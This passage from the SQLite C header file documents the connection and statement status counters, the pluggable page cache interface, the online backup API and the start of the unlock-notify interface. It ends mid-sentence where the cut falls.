#define SQLITE_STATUS_SCRATCH_SIZE         8  /* NOT USED */
#define SQLITE_STATUS_MALLOC_COUNT         9

/*
** CAPI3REF: Database Connection Status
** METHOD: sqlite3
**
** ^This interface is used to retrieve runtime status information 
** about a single [database connection].  ^The first argument is the
** database connection object to be interrogated.  ^The second argument
** is an integer constant, taken from the set of
** [SQLITE_DBSTATUS options], that
** determines the parameter to interrogate.  The set of 
** [SQLITE_DBSTATUS options] is likely
** to grow in future releases of SQLite.
**
** ^The current value of the requested parameter is written into *pCur
** and the highest instantaneous value is written into *pHiwtr.  ^If
** the resetFlg is true, then the highest instantaneous value is
** reset back down to the current value.
**
** ^The sqlite3_db_status() routine returns SQLITE_OK on success and a
** non-zero [error code] on failure.
**
** See also: [sqlite3_status()] and [sqlite3_stmt_status()].
*/
SQLITE_API int sqlite3_db_status(sqlite3*, int op, int *pCur, int *pHiwtr, int resetFlg);

/*
** CAPI3REF: Status Parameters for database connections
** KEYWORDS: {SQLITE_DBSTATUS options}
**
** These constants are the available integer "verbs" that can be passed as
** the second argument to the [sqlite3_db_status()] interface.
**
** New verbs may be added in future releases of SQLite. Existing verbs
** might be discontinued. Applications should check the return code from
** [sqlite3_db_status()] to make sure that the call worked.
** The [sqlite3_db_status()] interface will return a non-zero error code
** if a discontinued or unsupported verb is invoked.
**
** <dl>
** [[SQLITE_DBSTATUS_LOOKASIDE_USED]] ^(<dt>SQLITE_DBSTATUS_LOOKASIDE_USED</dt>
** <dd>This parameter returns the number of lookaside memory slots currently
** checked out.</dd>)^
**
** [[SQLITE_DBSTATUS_LOOKASIDE_HIT]] ^(<dt>SQLITE_DBSTATUS_LOOKASIDE_HIT</dt>
** <dd>This parameter returns the number malloc attempts that were 
** satisfied using lookaside memory. Only the high-water value is meaningful;
** the current value is always zero.)^
**
** [[SQLITE_DBSTATUS_LOOKASIDE_MISS_SIZE]]
** ^(<dt>SQLITE_DBSTATUS_LOOKASIDE_MISS_SIZE</dt>
** <dd>This parameter returns the number malloc attempts that might have
** been satisfied using lookaside memory but failed due to the amount of
** memory requested being larger than the lookaside slot size.
** Only the high-water value is meaningful;
** the current value is always zero.)^
**
** [[SQLITE_DBSTATUS_LOOKASIDE_MISS_FULL]]
** ^(<dt>SQLITE_DBSTATUS_LOOKASIDE_MISS_FULL</dt>
** <dd>This parameter returns the number malloc attempts that might have
** been satisfied using lookaside memory but failed due to all lookaside
** memory already being in use.
** Only the high-water value is meaningful;
** the current value is always zero.)^
**
** [[SQLITE_DBSTATUS_CACHE_USED]] ^(<dt>SQLITE_DBSTATUS_CACHE_USED</dt>
** <dd>This parameter returns the approximate number of bytes of heap
** memory used by all pager caches associated with the database connection.)^
** ^The highwater mark associated with SQLITE_DBSTATUS_CACHE_USED is always 0.
**
** [[SQLITE_DBSTATUS_CACHE_USED_SHARED]] 
** ^(<dt>SQLITE_DBSTATUS_CACHE_USED_SHARED</dt>
** <dd>This parameter is similar to DBSTATUS_CACHE_USED, except that if a
** pager cache is shared between two or more connections the bytes of heap
** memory used by that pager cache is divided evenly between the attached
** connections.)^  In other words, if none of the pager caches associated
** with the database connection are shared, this request returns the same
** value as DBSTATUS_CACHE_USED. Or, if one or more or the pager caches are
** shared, the value returned by this call will be smaller than that returned
** by DBSTATUS_CACHE_USED. ^The highwater mark associated with
** SQLITE_DBSTATUS_CACHE_USED_SHARED is always 0.
**
** [[SQLITE_DBSTATUS_SCHEMA_USED]] ^(<dt>SQLITE_DBSTATUS_SCHEMA_USED</dt>
** <dd>This parameter returns the approximate number of bytes of heap
** memory used to store the schema for all databases associated
** with the connection - main, temp, and any [ATTACH]-ed databases.)^ 
** ^The full amount of memory used by the schemas is reported, even if the
** schema memory is shared with other database connections due to
** [shared cache mode] being enabled.
** ^The highwater mark associated with SQLITE_DBSTATUS_SCHEMA_USED is always 0.
**
** [[SQLITE_DBSTATUS_STMT_USED]] ^(<dt>SQLITE_DBSTATUS_STMT_USED</dt>
** <dd>This parameter returns the approximate number of bytes of heap
** and lookaside memory used by all prepared statements associated with
** the database connection.)^
** ^The highwater mark associated with SQLITE_DBSTATUS_STMT_USED is always 0.
** </dd>
**
** [[SQLITE_DBSTATUS_CACHE_HIT]] ^(<dt>SQLITE_DBSTATUS_CACHE_HIT</dt>
** <dd>This parameter returns the number of pager cache hits that have
** occurred.)^ ^The highwater mark associated with SQLITE_DBSTATUS_CACHE_HIT 
** is always 0.
** </dd>
**
** [[SQLITE_DBSTATUS_CACHE_MISS]] ^(<dt>SQLITE_DBSTATUS_CACHE_MISS</dt>
** <dd>This parameter returns the number of pager cache misses that have
** occurred.)^ ^The highwater mark associated with SQLITE_DBSTATUS_CACHE_MISS 
** is always 0.
** </dd>
**
** [[SQLITE_DBSTATUS_CACHE_WRITE]] ^(<dt>SQLITE_DBSTATUS_CACHE_WRITE</dt>
** <dd>This parameter returns the number of dirty cache entries that have
** been written to disk. Specifically, the number of pages written to the
** wal file in wal mode databases, or the number of pages written to the
** database file in rollback mode databases. Any pages written as part of
** transaction rollback or database recovery operations are not included.
** If an IO or other error occurs while writing a page to disk, the effect
** on subsequent SQLITE_DBSTATUS_CACHE_WRITE requests is undefined.)^ ^The
** highwater mark associated with SQLITE_DBSTATUS_CACHE_WRITE is always 0.
** </dd>
**
** [[SQLITE_DBSTATUS_CACHE_SPILL]] ^(<dt>SQLITE_DBSTATUS_CACHE_SPILL</dt>
** <dd>This parameter returns the number of dirty cache entries that have
** been written to disk in the middle of a transaction due to the page
** cache overflowing. Transactions are more efficient if they are written
** to disk all at once. When pages spill mid-transaction, that introduces
** additional overhead. This parameter can be used help identify
** inefficiencies that can be resolve by increasing the cache size.
** </dd>
**
** [[SQLITE_DBSTATUS_DEFERRED_FKS]] ^(<dt>SQLITE_DBSTATUS_DEFERRED_FKS</dt>
** <dd>This parameter returns zero for the current value if and only if
** all foreign key constraints (deferred or immediate) have been
** resolved.)^  ^The highwater mark is always 0.
** </dd>
** </dl>
*/
#define SQLITE_DBSTATUS_LOOKASIDE_USED       0
#define SQLITE_DBSTATUS_CACHE_USED           1
#define SQLITE_DBSTATUS_SCHEMA_USED          2
#define SQLITE_DBSTATUS_STMT_USED            3
#define SQLITE_DBSTATUS_LOOKASIDE_HIT        4
#define SQLITE_DBSTATUS_LOOKASIDE_MISS_SIZE  5
#define SQLITE_DBSTATUS_LOOKASIDE_MISS_FULL  6
#define SQLITE_DBSTATUS_CACHE_HIT            7
#define SQLITE_DBSTATUS_CACHE_MISS           8
#define SQLITE_DBSTATUS_CACHE_WRITE          9
#define SQLITE_DBSTATUS_DEFERRED_FKS        10
#define SQLITE_DBSTATUS_CACHE_USED_SHARED   11
#define SQLITE_DBSTATUS_CACHE_SPILL         12
#define SQLITE_DBSTATUS_MAX                 12   /* Largest defined DBSTATUS */


/*
** CAPI3REF: Prepared Statement Status
** METHOD: sqlite3_stmt
**
** ^(Each prepared statement maintains various
** [SQLITE_STMTSTATUS counters] that measure the number
** of times it has performed specific operations.)^  These counters can
** be used to monitor the performance characteristics of the prepared
** statements.  For example, if the number of table steps greatly exceeds
** the number of table searches or result rows, that would tend to indicate
** that the prepared statement is using a full table scan rather than
** an index.  
**
** ^(This interface is used to retrieve and reset counter values from
** a [prepared statement].  The first argument is the prepared statement
** object to be interrogated.  The second argument
** is an integer code for a specific [SQLITE_STMTSTATUS counter]
** to be interrogated.)^
** ^The current value of the requested counter is returned.
** ^If the resetFlg is true, then the counter is reset to zero after this
** interface call returns.
**
** See also: [sqlite3_status()] and [sqlite3_db_status()].
*/
SQLITE_API int sqlite3_stmt_status(sqlite3_stmt*, int op,int resetFlg);

/*
** CAPI3REF: Status Parameters for prepared statements
** KEYWORDS: {SQLITE_STMTSTATUS counter} {SQLITE_STMTSTATUS counters}
**
** These preprocessor macros define integer codes that name counter
** values associated with the [sqlite3_stmt_status()] interface.
** The meanings of the various counters are as follows:
**
** <dl>
** [[SQLITE_STMTSTATUS_FULLSCAN_STEP]] <dt>SQLITE_STMTSTATUS_FULLSCAN_STEP</dt>
** <dd>^This is the number of times that SQLite has stepped forward in
** a table as part of a full table scan.  Large numbers for this counter
** may indicate opportunities for performance improvement through 
** careful use of indices.</dd>
**
** [[SQLITE_STMTSTATUS_SORT]] <dt>SQLITE_STMTSTATUS_SORT</dt>
** <dd>^This is the number of sort operations that have occurred.
** A non-zero value in this counter may indicate an opportunity to
** improvement performance through careful use of indices.</dd>
**
** [[SQLITE_STMTSTATUS_AUTOINDEX]] <dt>SQLITE_STMTSTATUS_AUTOINDEX</dt>
** <dd>^This is the number of rows inserted into transient indices that
** were created automatically in order to help joins run faster.
** A non-zero value in this counter may indicate an opportunity to
** improvement performance by adding permanent indices that do not
** need to be reinitialized each time the statement is run.</dd>
**
** [[SQLITE_STMTSTATUS_VM_STEP]] <dt>SQLITE_STMTSTATUS_VM_STEP</dt>
** <dd>^This is the number of virtual machine operations executed
** by the prepared statement if that number is less than or equal
** to 2147483647.  The number of virtual machine operations can be 
** used as a proxy for the total work done by the prepared statement.
** If the number of virtual machine operations exceeds 2147483647
** then the value returned by this statement status code is undefined.
**
** [[SQLITE_STMTSTATUS_REPREPARE]] <dt>SQLITE_STMTSTATUS_REPREPARE</dt>
** <dd>^This is the number of times that the prepare statement has been
** automatically regenerated due to schema changes or change to 
** [bound parameters] that might affect the query plan.
**
** [[SQLITE_STMTSTATUS_RUN]] <dt>SQLITE_STMTSTATUS_RUN</dt>
** <dd>^This is the number of times that the prepared statement has
** been run.  A single "run" for the purposes of this counter is one
** or more calls to [sqlite3_step()] followed by a call to [sqlite3_reset()].
** The counter is incremented on the first [sqlite3_step()] call of each
** cycle.
**
** [[SQLITE_STMTSTATUS_MEMUSED]] <dt>SQLITE_STMTSTATUS_MEMUSED</dt>
** <dd>^This is the approximate number of bytes of heap memory
** used to store the prepared statement.  ^This value is not actually
** a counter, and so the resetFlg parameter to sqlite3_stmt_status()
** is ignored when the opcode is SQLITE_STMTSTATUS_MEMUSED.
** </dd>
** </dl>
*/
#define SQLITE_STMTSTATUS_FULLSCAN_STEP     1
#define SQLITE_STMTSTATUS_SORT              2
#define SQLITE_STMTSTATUS_AUTOINDEX         3
#define SQLITE_STMTSTATUS_VM_STEP           4
#define SQLITE_STMTSTATUS_REPREPARE         5
#define SQLITE_STMTSTATUS_RUN               6
#define SQLITE_STMTSTATUS_MEMUSED           99

/*
** CAPI3REF: Custom Page Cache Object
**
** The sqlite3_pcache type is opaque.  It is implemented by
** the pluggable module.  The SQLite core has no knowledge of
** its size or internal structure and never deals with the
** sqlite3_pcache object except by holding and passing pointers
** to the object.
**
** See [sqlite3_pcache_methods2] for additional information.
*/
typedef struct sqlite3_pcache sqlite3_pcache;

/*
** CAPI3REF: Custom Page Cache Object
**
** The sqlite3_pcache_page object represents a single page in the
** page cache.  The page cache will allocate instances of this
** object.  Various methods of the page cache use pointers to instances
** of this object as parameters or as their return value.
**
** See [sqlite3_pcache_methods2] for additional information.
*/
typedef struct sqlite3_pcache_page sqlite3_pcache_page;
struct sqlite3_pcache_page {
  void *pBuf;        /* The content of the page */
  void *pExtra;      /* Extra information associated with the page */
};

/*
** CAPI3REF: Application Defined Page Cache.
** KEYWORDS: {page cache}
**
** ^(The [sqlite3_config]([SQLITE_CONFIG_PCACHE2], ...) interface can
** register an alternative page cache implementation by passing in an 
** instance of the sqlite3_pcache_methods2 structure.)^
** In many applications, most of the heap memory allocated by 
** SQLite is used for the page cache.
** By implementing a 
** custom page cache using this API, an application can better control
** the amount of memory consumed by SQLite, the way in which 
** that memory is allocated and released, and the policies used to 
** determine exactly which parts of a database file are cached and for 
** how long.
**
** The alternative page cache mechanism is an
** extreme measure that is only needed by the most demanding applications.
** The built-in page cache is recommended for most uses.
**
** ^(The contents of the sqlite3_pcache_methods2 structure are copied to an
** internal buffer by SQLite within the call to [sqlite3_config].  Hence
** the application may discard the parameter after the call to
** [sqlite3_config()] returns.)^
**
** [[the xInit() page cache method]]
** ^(The xInit() method is called once for each effective 
** call to [sqlite3_initialize()])^
** (usually only once during the lifetime of the process). ^(The xInit()
** method is passed a copy of the sqlite3_pcache_methods2.pArg value.)^
** The intent of the xInit() method is to set up global data structures 
** required by the custom page cache implementation. 
** ^(If the xInit() method is NULL, then the 
** built-in default page cache is used instead of the application defined
** page cache.)^
**
** [[the xShutdown() page cache method]]
** ^The xShutdown() method is called by [sqlite3_shutdown()].
** It can be used to clean up 
** any outstanding resources before process shutdown, if required.
** ^The xShutdown() method may be NULL.
**
** ^SQLite automatically serializes calls to the xInit method,
** so the xInit method need not be threadsafe.  ^The
** xShutdown method is only called from [sqlite3_shutdown()] so it does
** not need to be threadsafe either.  All other methods must be threadsafe
** in multithreaded applications.
**
** ^SQLite will never invoke xInit() more than once without an intervening
** call to xShutdown().
**
** [[the xCreate() page cache methods]]
** ^SQLite invokes the xCreate() method to construct a new cache instance.
** SQLite will typically create one cache instance for each open database file,
** though this is not guaranteed. ^The
** first parameter, szPage, is the size in bytes of the pages that must
** be allocated by the cache.  ^szPage will always a power of two.  ^The
** second parameter szExtra is a number of bytes of extra storage 
** associated with each page cache entry.  ^The szExtra parameter will
** a number less than 250.  SQLite will use the
** extra szExtra bytes on each page to store metadata about the underlying
** database page on disk.  The value passed into szExtra depends
** on the SQLite version, the target platform, and how SQLite was compiled.
** ^The third argument to xCreate(), bPurgeable, is true if the cache being
** created will be used to cache database pages of a file stored on disk, or
** false if it is used for an in-memory database. The cache implementation
** does not have to do anything special based with the value of bPurgeable;
** it is purely advisory.  ^On a cache where bPurgeable is false, SQLite will
** never invoke xUnpin() except to deliberately delete a page.
** ^In other words, calls to xUnpin() on a cache with bPurgeable set to
** false will always have the "discard" flag set to true.  
** ^Hence, a cache created with bPurgeable false will
** never contain any unpinned pages.
**
** [[the xCachesize() page cache method]]
** ^(The xCachesize() method may be called at any time by SQLite to set the
** suggested maximum cache-size (number of pages stored by) the cache
** instance passed as the first argument. This is the value configured using
** the SQLite "[PRAGMA cache_size]" command.)^  As with the bPurgeable
** parameter, the implementation is not required to do anything with this
** value; it is advisory only.
**
** [[the xPagecount() page cache methods]]
** The xPagecount() method must return the number of pages currently
** stored in the cache, both pinned and unpinned.
** 
** [[the xFetch() page cache methods]]
** The xFetch() method locates a page in the cache and returns a pointer to 
** an sqlite3_pcache_page object associated with that page, or a NULL pointer.
** The pBuf element of the returned sqlite3_pcache_page object will be a
** pointer to a buffer of szPage bytes used to store the content of a 
** single database page.  The pExtra element of sqlite3_pcache_page will be
** a pointer to the szExtra bytes of extra storage that SQLite has requested
** for each entry in the page cache.
**
** The page to be fetched is determined by the key. ^The minimum key value
** is 1.  After it has been retrieved using xFetch, the page is considered
** to be "pinned".
**
** If the requested page is already in the page cache, then the page cache
** implementation must return a pointer to the page buffer with its content
** intact.  If the requested page is not already in the cache, then the
** cache implementation should use the value of the createFlag
** parameter to help it determined what action to take:
**
** <table border=1 width=85% align=center>
** <tr><th> createFlag <th> Behavior when page is not already in cache
** <tr><td> 0 <td> Do not allocate a new page.  Return NULL.
** <tr><td> 1 <td> Allocate a new page if it easy and convenient to do so.
**                 Otherwise return NULL.
** <tr><td> 2 <td> Make every effort to allocate a new page.  Only return
**                 NULL if allocating a new page is effectively impossible.
** </table>
**
** ^(SQLite will normally invoke xFetch() with a createFlag of 0 or 1.  SQLite
** will only use a createFlag of 2 after a prior call with a createFlag of 1
** failed.)^  In between the to xFetch() calls, SQLite may
** attempt to unpin one or more cache pages by spilling the content of
** pinned pages to disk and synching the operating system disk cache.
**
** [[the xUnpin() page cache method]]
** ^xUnpin() is called by SQLite with a pointer to a currently pinned page
** as its second argument.  If the third parameter, discard, is non-zero,
** then the page must be evicted from the cache.
** ^If the discard parameter is
** zero, then the page may be discarded or retained at the discretion of
** page cache implementation. ^The page cache implementation
** may choose to evict unpinned pages at any time.
**
** The cache must not perform any reference counting. A single 
** call to xUnpin() unpins the page regardless of the number of prior calls 
** to xFetch().
**
** [[the xRekey() page cache methods]]
** The xRekey() method is used to change the key value associated with the
** page passed as the second argument. If the cache
** previously contains an entry associated with newKey, it must be
** discarded. ^Any prior cache entry associated with newKey is guaranteed not
** to be pinned.
**
** When SQLite calls the xTruncate() method, the cache must discard all
** existing cache entries with page numbers (keys) greater than or equal
** to the value of the iLimit parameter passed to xTruncate(). If any
** of these pages are pinned, they are implicitly unpinned, meaning that
** they can be safely discarded.
**
** [[the xDestroy() page cache method]]
** ^The xDestroy() method is used to delete a cache allocated by xCreate().
** All resources associated with the specified cache should be freed. ^After
** calling the xDestroy() method, SQLite considers the [sqlite3_pcache*]
** handle invalid, and will not use it with any other sqlite3_pcache_methods2
** functions.
**
** [[the xShrink() page cache method]]
** ^SQLite invokes the xShrink() method when it wants the page cache to
** free up as much of heap memory as possible.  The page cache implementation
** is not obligated to free any memory, but well-behaved implementations should
** do their best.
*/
typedef struct sqlite3_pcache_methods2 sqlite3_pcache_methods2;
struct sqlite3_pcache_methods2 {
  int iVersion;
  void *pArg;
  int (*xInit)(void*);
  void (*xShutdown)(void*);
  sqlite3_pcache *(*xCreate)(int szPage, int szExtra, int bPurgeable);
  void (*xCachesize)(sqlite3_pcache*, int nCachesize);
  int (*xPagecount)(sqlite3_pcache*);
  sqlite3_pcache_page *(*xFetch)(sqlite3_pcache*, unsigned key, int createFlag);
  void (*xUnpin)(sqlite3_pcache*, sqlite3_pcache_page*, int discard);
  void (*xRekey)(sqlite3_pcache*, sqlite3_pcache_page*, 
      unsigned oldKey, unsigned newKey);
  void (*xTruncate)(sqlite3_pcache*, unsigned iLimit);
  void (*xDestroy)(sqlite3_pcache*);
  void (*xShrink)(sqlite3_pcache*);
};

/*
** This is the obsolete pcache_methods object that has now been replaced
** by sqlite3_pcache_methods2.  This object is not used by SQLite.  It is
** retained in the header file for backwards compatibility only.
*/
typedef struct sqlite3_pcache_methods sqlite3_pcache_methods;
struct sqlite3_pcache_methods {
  void *pArg;
  int (*xInit)(void*);
  void (*xShutdown)(void*);
  sqlite3_pcache *(*xCreate)(int szPage, int bPurgeable);
  void (*xCachesize)(sqlite3_pcache*, int nCachesize);
  int (*xPagecount)(sqlite3_pcache*);
  void *(*xFetch)(sqlite3_pcache*, unsigned key, int createFlag);
  void (*xUnpin)(sqlite3_pcache*, void*, int discard);
  void (*xRekey)(sqlite3_pcache*, void*, unsigned oldKey, unsigned newKey);
  void (*xTruncate)(sqlite3_pcache*, unsigned iLimit);
  void (*xDestroy)(sqlite3_pcache*);
};


/*
** CAPI3REF: Online Backup Object
**
** The sqlite3_backup object records state information about an ongoing
** online backup operation.  ^The sqlite3_backup object is created by
** a call to [sqlite3_backup_init()] and is destroyed by a call to
** [sqlite3_backup_finish()].
**
** See Also: [Using the SQLite Online Backup API]
*/
typedef struct sqlite3_backup sqlite3_backup;

/*
** CAPI3REF: Online Backup API.
**
** The backup API copies the content of one database into another.
** It is useful either for creating backups of databases or
** for copying in-memory databases to or from persistent files. 
**
** See Also: [Using the SQLite Online Backup API]
**
** ^SQLite holds a write transaction open on the destination database file
** for the duration of the backup operation.
** ^The source database is read-locked only while it is being read;
** it is not locked continuously for the entire backup operation.
** ^Thus, the backup may be performed on a live source database without
** preventing other database connections from
** reading or writing to the source database while the backup is underway.
** 
** ^(To perform a backup operation: 
**   <ol>
**     <li><b>sqlite3_backup_init()</b> is called once to initialize the
**         backup, 
**     <li><b>sqlite3_backup_step()</b> is called one or more times to transfer 
**         the data between the two databases, and finally
**     <li><b>sqlite3_backup_finish()</b> is called to release all resources 
**         associated with the backup operation. 
**   </ol>)^
** There should be exactly one call to sqlite3_backup_finish() for each
** successful call to sqlite3_backup_init().
**
** [[sqlite3_backup_init()]] <b>sqlite3_backup_init()</b>
**
** ^The D and N arguments to sqlite3_backup_init(D,N,S,M) are the 
** [database connection] associated with the destination database 
** and the database name, respectively.
** ^The database name is "main" for the main database, "temp" for the
** temporary database, or the name specified after the AS keyword in
** an [ATTACH] statement for an attached database.
** ^The S and M arguments passed to 
** sqlite3_backup_init(D,N,S,M) identify the [database connection]
** and database name of the source database, respectively.
** ^The source and destination [database connections] (parameters S and D)
** must be different or else sqlite3_backup_init(D,N,S,M) will fail with
** an error.
**
** ^A call to sqlite3_backup_init() will fail, returning NULL, if 
** there is already a read or read-write transaction open on the 
** destination database.
**
** ^If an error occurs within sqlite3_backup_init(D,N,S,M), then NULL is
** returned and an error code and error message are stored in the
** destination [database connection] D.
** ^The error code and message for the failed call to sqlite3_backup_init()
** can be retrieved using the [sqlite3_errcode()], [sqlite3_errmsg()], and/or
** [sqlite3_errmsg16()] functions.
** ^A successful call to sqlite3_backup_init() returns a pointer to an
** [sqlite3_backup] object.
** ^The [sqlite3_backup] object may be used with the sqlite3_backup_step() and
** sqlite3_backup_finish() functions to perform the specified backup 
** operation.
**
** [[sqlite3_backup_step()]] <b>sqlite3_backup_step()</b>
**
** ^Function sqlite3_backup_step(B,N) will copy up to N pages between 
** the source and destination databases specified by [sqlite3_backup] object B.
** ^If N is negative, all remaining source pages are copied. 
** ^If sqlite3_backup_step(B,N) successfully copies N pages and there
** are still more pages to be copied, then the function returns [SQLITE_OK].
** ^If sqlite3_backup_step(B,N) successfully finishes copying all pages
** from source to destination, then it returns [SQLITE_DONE].
** ^If an error occurs while running sqlite3_backup_step(B,N),
** then an [error code] is returned. ^As well as [SQLITE_OK] and
** [SQLITE_DONE], a call to sqlite3_backup_step() may return [SQLITE_READONLY],
** [SQLITE_NOMEM], [SQLITE_BUSY], [SQLITE_LOCKED], or an
** [SQLITE_IOERR_ACCESS | SQLITE_IOERR_XXX] extended error code.
**
** ^(The sqlite3_backup_step() might return [SQLITE_READONLY] if
** <ol>
** <li> the destination database was opened read-only, or
** <li> the destination database is using write-ahead-log journaling
** and the destination and source page sizes differ, or
** <li> the destination database is an in-memory database and the
** destination and source page sizes differ.
** </ol>)^
**
** ^If sqlite3_backup_step() cannot obtain a required file-system lock, then
** the [sqlite3_busy_handler | busy-handler function]
** is invoked (if one is specified). ^If the 
** busy-handler returns non-zero before the lock is available, then 
** [SQLITE_BUSY] is returned to the caller. ^In this case the call to
** sqlite3_backup_step() can be retried later. ^If the source
** [database connection]
** is being used to write to the source database when sqlite3_backup_step()
** is called, then [SQLITE_LOCKED] is returned immediately. ^Again, in this
** case the call to sqlite3_backup_step() can be retried later on. ^(If
** [SQLITE_IOERR_ACCESS | SQLITE_IOERR_XXX], [SQLITE_NOMEM], or
** [SQLITE_READONLY] is returned, then 
** there is no point in retrying the call to sqlite3_backup_step(). These 
** errors are considered fatal.)^  The application must accept 
** that the backup operation has failed and pass the backup operation handle 
** to the sqlite3_backup_finish() to release associated resources.
**
** ^The first call to sqlite3_backup_step() obtains an exclusive lock
** on the destination file. ^The exclusive lock is not released until either 
** sqlite3_backup_finish() is called or the backup operation is complete 
** and sqlite3_backup_step() returns [SQLITE_DONE].  ^Every call to
** sqlite3_backup_step() obtains a [shared lock] on the source database that
** lasts for the duration of the sqlite3_backup_step() call.
** ^Because the source database is not locked between calls to
** sqlite3_backup_step(), the source database may be modified mid-way
** through the backup process.  ^If the source database is modified by an
** external process or via a database connection other than the one being
** used by the backup operation, then the backup will be automatically
** restarted by the next call to sqlite3_backup_step(). ^If the source 
** database is modified by the using the same database connection as is used
** by the backup operation, then the backup database is automatically
** updated at the same time.
**
** [[sqlite3_backup_finish()]] <b>sqlite3_backup_finish()</b>
**
** When sqlite3_backup_step() has returned [SQLITE_DONE], or when the 
** application wishes to abandon the backup operation, the application
** should destroy the [sqlite3_backup] by passing it to sqlite3_backup_finish().
** ^The sqlite3_backup_finish() interfaces releases all
** resources associated with the [sqlite3_backup] object. 
** ^If sqlite3_backup_step() has not yet returned [SQLITE_DONE], then any
** active write-transaction on the destination database is rolled back.
** The [sqlite3_backup] object is invalid
** and may not be used following a call to sqlite3_backup_finish().
**
** ^The value returned by sqlite3_backup_finish is [SQLITE_OK] if no
** sqlite3_backup_step() errors occurred, regardless or whether or not
** sqlite3_backup_step() completed.
** ^If an out-of-memory condition or IO error occurred during any prior
** sqlite3_backup_step() call on the same [sqlite3_backup] object, then
** sqlite3_backup_finish() returns the corresponding [error code].
**
** ^A return of [SQLITE_BUSY] or [SQLITE_LOCKED] from sqlite3_backup_step()
** is not a permanent error and does not affect the return value of
** sqlite3_backup_finish().
**
** [[sqlite3_backup_remaining()]] [[sqlite3_backup_pagecount()]]
** <b>sqlite3_backup_remaining() and sqlite3_backup_pagecount()</b>
**
** ^The sqlite3_backup_remaining() routine returns the number of pages still
** to be backed up at the conclusion of the most recent sqlite3_backup_step().
** ^The sqlite3_backup_pagecount() routine returns the total number of pages
** in the source database at the conclusion of the most recent
** sqlite3_backup_step().
** ^(The values returned by these functions are only updated by
** sqlite3_backup_step(). If the source database is modified in a way that
** changes the size of the source database or the number of pages remaining,
** those changes are not reflected in the output of sqlite3_backup_pagecount()
** and sqlite3_backup_remaining() until after the next
** sqlite3_backup_step().)^
**
** <b>Concurrent Usage of Database Handles</b>
**
** ^The source [database connection] may be used by the application for other
** purposes while a backup operation is underway or being initialized.
** ^If SQLite is compiled and configured to support threadsafe database
** connections, then the source database connection may be used concurrently
** from within other threads.
**
** However, the application must guarantee that the destination 
** [database connection] is not passed to any other API (by any thread) after 
** sqlite3_backup_init() is called and before the corresponding call to
** sqlite3_backup_finish().  SQLite does not currently check to see
** if the application incorrectly accesses the destination [database connection]
** and so no error code is reported, but the operations may malfunction
** nevertheless.  Use of the destination database connection while a
** backup is in progress might also also cause a mutex deadlock.
**
** If running in [shared cache mode], the application must
** guarantee that the shared cache used by the destination database
** is not accessed while the backup is running. In practice this means
** that the application must guarantee that the disk file being 
** backed up to is not accessed by any connection within the process,
** not just the specific connection that was passed to sqlite3_backup_init().
**
** The [sqlite3_backup] object itself is partially threadsafe. Multiple 
** threads may safely make multiple concurrent calls to sqlite3_backup_step().
** However, the sqlite3_backup_remaining() and sqlite3_backup_pagecount()
** APIs are not strictly speaking threadsafe. If they are invoked at the
** same time as another thread is invoking sqlite3_backup_step() it is
** possible that they return invalid values.
*/
SQLITE_API sqlite3_backup *sqlite3_backup_init(
  sqlite3 *pDest,                        /* Destination database handle */
  const char *zDestName,                 /* Destination database name */
  sqlite3 *pSource,                      /* Source database handle */
  const char *zSourceName                /* Source database name */
);
SQLITE_API int sqlite3_backup_step(sqlite3_backup *p, int nPage);
SQLITE_API int sqlite3_backup_finish(sqlite3_backup *p);
SQLITE_API int sqlite3_backup_remaining(sqlite3_backup *p);
SQLITE_API int sqlite3_backup_pagecount(sqlite3_backup *p);

/*
** CAPI3REF: Unlock Notification
** METHOD: sqlite3
**
** ^When running in shared-cache mode, a database operation may fail with
** an [SQLITE_LOCKED] error if the required locks on the shared-cache or
** individual tables within the shared-cache cannot be obtained. See
** [SQLite Shared-Cache Mode] for a description of shared-cache locking. 
** ^This API may be used to register a callback that SQLite will invoke 
** when the connection currently holding the required lock relinquishes it.
** ^This API is only available if the library was compiled with the
** [SQLITE_ENABLE_UNLOCK_NOTIFY] C-preprocessor symbol defined.
**
** See Also: [Using the SQLite Unlock Notification Feature].
**
** ^Shared-cache locks are released when a database connection concludes
** its current transaction, either by committing it or rolling it back. 
**
** ^When a connection (known as the blocked connection) fails to obtain a
** shared-cache lock and SQLITE_LOCKED is returned to the caller, the
** identity of the database connection (the blocking connection) that
** has locked the required resource is stored internally. ^After an 
** application receives an SQLITE_LOCKED error, it may call the
** sqlite3_unlock_notify() method with the blocked connection handle as 
** the first argument to register for a callback that will be invoked
** when the blocking connections current transaction is concluded. ^The
** callback is invoked from within the [sqlite3_step] or [sqlite3_close]
** call that concludes the blocking connections transaction.
**
** ^(If sqlite3_unlock_notify() is called in a multi-threaded application,
** there is a chance that the blocking connection will have already
** concluded its transaction by the time sqlite3_unlock_notify() is invoked.
** If this happens, then the specified callback is invoked immediately,
** from within the call to sqlite3_unlock_notify().)^
**
** ^If the blocked connection is attempting to obtain a write-lock on a
** shared-cache table, and more than one other connection currently holds
** a read-lock on the same table, then SQLite arbitrarily selects one of 
** the other connections to use as the blocking connection.
**
** ^(There may be at most one unlock-notify callback registered by a 
** blocked connection. If sqlite3_unlock_notify() is called when the
** blocked connection already has a registered unlock-notify callback,
** then the new callback replaces the old.)^ ^If sqlite3_unlock_notify() is
** called with a NULL pointer as its second argument, then any existing
** unlock-notify callback is canceled. ^The blocked connections 
** unlock-notify callback may also be canceled by closing the blocked
** connection using [sqlite3_close()].
**
** The unlock-notify callback is not reentrant. If an application invokes
** any sqlite3_xxx API functions from within an unlock-notify callback, a
** crash or deadlock may be the result.
**
** ^Unless deadlock is detected (see below), sqlite3_unlock_notify() always
** returns SQLITE_OK.
**
** <b>Callback Invocation Details</b>
**
** When an unlock-notify callback is registered, the application provides a 
** single void* pointer that is passed to the callback when it is invoked.
** However, the signature of the callback function allows SQLite to pass
** it an array of void* context pointers. The first argument passed to
** an unlock-notify callback is a pointer to an array of void* pointers,
** and the second is the number of entries in the array.
**
** When a blocking connections transaction is concluded, there may be
** more than one blocked connection that has registered for an unlock-notify
** callback. ^If two or more such blocked connections have specified the
** same callback function, then instead of invoking the callback function
** multiple times, it is invoked once with the set of void* context pointers
** specified by the blocked connections bundled together into an array.
** This gives the application an opportunity to prioritize any actions 
** related to the set of unblocked database connections.
**
** <b>Deadlock Detection</b>
**
** Assuming that after registering for an unlock-notify callback a 
** database waits for the callback to be issued before taking any further
** action (a reasonable assumption), then using this API may cause the
** application to deadlock. For example, if connection X is waiting for
** connection Y's transaction to be concluded, and similarly connection
** Y is waiting on connection X's transaction, then neither connection
** will proceed and the system may remain deadlocked indefinitely.
**
** To avoid this scenario, the sqlite3_unlock_notify() performs deadlock
